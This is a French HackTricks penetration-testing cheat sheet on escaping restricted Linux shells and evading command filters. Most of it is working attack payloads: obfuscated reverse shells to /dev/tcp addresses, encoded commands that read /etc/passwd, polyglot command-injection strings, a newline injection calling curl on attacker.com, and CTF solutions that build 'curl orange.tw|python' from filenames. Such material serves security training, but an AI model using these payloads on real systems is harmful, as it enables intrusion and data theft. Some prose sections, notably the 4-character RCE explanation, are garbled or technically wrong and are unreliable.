# Contourner les restrictions de shell Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilisez [**Trickest**](https://trickest.io/) pour créer et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Contournement des limitations courantes

### Shell inversé
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Rev shell court

Le reverse shell court est une technique de piratage qui permet à un attaquant d'établir une connexion à distance avec une machine cible. Cette technique est souvent utilisée pour contourner les restrictions de Bash et obtenir un accès non autorisé à un système. Voici un exemple de commande pour établir une connexion de reverse shell court :

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Dans cet exemple, la commande Bash est utilisée pour rediriger les entrées et sorties standard vers une connexion TCP à l'adresse IP 10.0.0.1 sur le port 8080. Cela permet à l'attaquant d'exécuter des commandes à distance sur la machine cible.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Contourner les chemins et les mots interdits

---

#### Description

Lorsque vous êtes dans un shell restreint, il peut y avoir des chemins ou des mots interdits qui vous empêchent d'exécuter certaines commandes. Cependant, il existe des moyens de contourner ces restrictions en utilisant des chemins alternatifs ou en renommant les commandes.

#### Contournement de chemins interdits

Si un chemin est interdit, vous pouvez essayer d'utiliser un chemin alternatif pour accéder à la commande. Par exemple, si `/bin/ls` est interdit, vous pouvez essayer d'utiliser `/usr/bin/ls` ou `/bin/../usr/bin/ls`.

#### Contournement de mots interdits

Si un mot est interdit, vous pouvez essayer de renommer la commande que vous voulez exécuter. Par exemple, si `ls` est interdit, vous pouvez renommer la commande en `myls` et l'exécuter avec ce nouveau nom.

```bash
$ cp /bin/ls /tmp/myls
$ PATH=/tmp:$PATH
$ myls
```

#### Contournement de chemins et de mots interdits

Si à la fois un chemin et un mot sont interdits, vous pouvez combiner les deux techniques précédentes. Par exemple, si `/bin/ls` est interdit et que `ls` est également interdit, vous pouvez renommer `/bin/ls` en `/tmp/myls` et l'exécuter avec ce nouveau nom.

```bash
$ cp /bin/ls /tmp/myls
$ PATH=/tmp:$PATH
$ myls
```

#### Contournement de la restriction de shell

Si vous êtes dans un shell restreint, vous pouvez essayer de lancer un nouveau shell en utilisant une commande qui n'est pas restreinte. Par exemple, si `bash` est restreint, vous pouvez essayer d'utiliser `sh` ou `dash`.

```bash
$ sh
$ echo "You are now in a new shell"
```

#### Contournement de la restriction de shell avec Python

Si vous ne pouvez pas exécuter de shell, vous pouvez essayer d'utiliser Python pour lancer un nouveau shell.

```python
$ python -c 'import os; os.system("/bin/sh")'
$ echo "You are now in a new shell"
```
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Contourner les espaces interdits

---

#### Description

Certaines restrictions de shell peuvent empêcher l'utilisation d'espaces dans les commandes. Cela peut être contourné en utilisant des caractères spéciaux pour représenter les espaces.

#### Technique

- Utiliser des guillemets simples ou doubles pour entourer la commande et les arguments qui contiennent des espaces.

```bash
$ ls 'my forbidden folder'
```

- Utiliser des caractères d'échappement pour représenter les espaces.

```bash
$ ls my\ forbidden\ folder
```

- Utiliser des variables pour stocker les arguments qui contiennent des espaces.

```bash
$ folder='my forbidden folder'
$ ls $folder
```

#### Exemple

```bash
$ ls 'my forbidden folder'
$ ls my\ forbidden\ folder
$ folder='my forbidden folder'
$ ls $folder
```

#### Références

- [Bash Reference Manual - Quoting](https://www.gnu.org/software/bash/manual/html_node/Quoting.html)
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Contourner les restrictions de backslash et de slash
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Contourner les pipes
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Contournement avec l'encodage hexadécimal
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Contourner les restrictions d'IP
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltration de données basée sur le temps
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtenir des caractères à partir de variables d'environnement

---

Il est possible d'obtenir des caractères à partir de variables d'environnement en utilisant la commande `echo` et en utilisant la syntaxe `${VAR:OFFSET:LENGTH}`.

- `VAR` est le nom de la variable d'environnement.
- `OFFSET` est l'index de départ à partir duquel extraire les caractères.
- `LENGTH` est le nombre de caractères à extraire.

Par exemple, pour extraire les 3 premiers caractères de la variable d'environnement `MY_VAR`, vous pouvez utiliser la commande suivante :

```
echo ${MY_VAR:0:3}
```

Cela affichera les 3 premiers caractères de la variable d'environnement `MY_VAR`.

Cette technique peut être utile pour contourner les restrictions de shell, car elle permet d'extraire des caractères à partir de variables d'environnement même si l'accès direct à ces variables est restreint.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltration de données DNS

Vous pouvez utiliser **burpcollab** ou [**pingb**](http://pingb.in) par exemple.

### Commandes intégrées

Dans le cas où vous ne pouvez pas exécuter de fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes intégrées pour obtenir RCE**, il existe quelques astuces pratiques pour y parvenir. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes intégrées**, vous devez donc **connaître toutes vos options** pour essayer de contourner la prison. Idée de [**devploit**](https://twitter.com/devploit).\
Tout d'abord, vérifiez toutes les [**commandes intégrées du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations** :
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injection de commande polyglotte
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Contourner les expressions régulières potentielles
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator est un outil qui permet de brouiller le code Bash pour éviter la détection par les outils de sécurité. Il peut être utilisé pour contourner les restrictions Bash telles que `restricted_shell` ou `rbash`. Le principe de fonctionnement de Bashfuscator est de transformer le code Bash en un code équivalent mais difficile à comprendre pour un humain. Cela rend la détection et l'analyse du code beaucoup plus difficiles pour les outils de sécurité.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE avec 5 caractères

Il est possible d'exécuter du code à distance (RCE) en utilisant seulement 5 caractères.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link 
## to it in the current folder
```
### RCE avec 4 caractères

#### Description

Il est possible d'exécuter du code à distance (RCE) en utilisant seulement 4 caractères dans un shell Bash restreint.

#### Technique

La technique consiste à utiliser la commande `exec` pour exécuter une commande externe. Cependant, la commande `exec` est restreinte dans un shell Bash restreint. Pour contourner cette restriction, nous pouvons utiliser la commande `eval` qui permet d'évaluer une chaîne de caractères comme une commande.

La commande `eval` n'est pas restreinte dans un shell Bash restreint, donc nous pouvons l'utiliser pour exécuter la commande `exec`. La commande `exec` peut être utilisée pour exécuter une commande externe avec les privilèges de l'utilisateur courant.

Voici la commande à utiliser :

```bash
eval "$(echo x${IFS}backtick${IFS}command${IFS}backtick)"
```

Remplacez `command` par la commande que vous souhaitez exécuter.

#### Exemple

```bash
$ echo $0
bash
$ bash -r
$ echo $0
bash
$ eval "$(echo x${IFS}backtick${IFS}id${IFS}backtick)"
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Contournement de la restriction de lecture seule / noexec

Si vous êtes dans un système de fichiers avec des protections de lecture seule et noexec, il existe encore des moyens d'exécuter des binaires arbitraires. L'un d'entre eux est l'utilisation de DDexec, vous pouvez trouver une explication de la technique dans:

{% content-ref url="../bypass-linux-shell-restrictions/ddexec.md" %}
[ddexec.md](../bypass-linux-shell-restrictions/ddexec.md)
{% endcontent-ref %}

## Contournement de Chroot et autres prisons

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Références et plus

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilisez [**Trickest**](https://trickest.io/) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité? Voulez-vous voir votre entreprise annoncée dans HackTricks? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
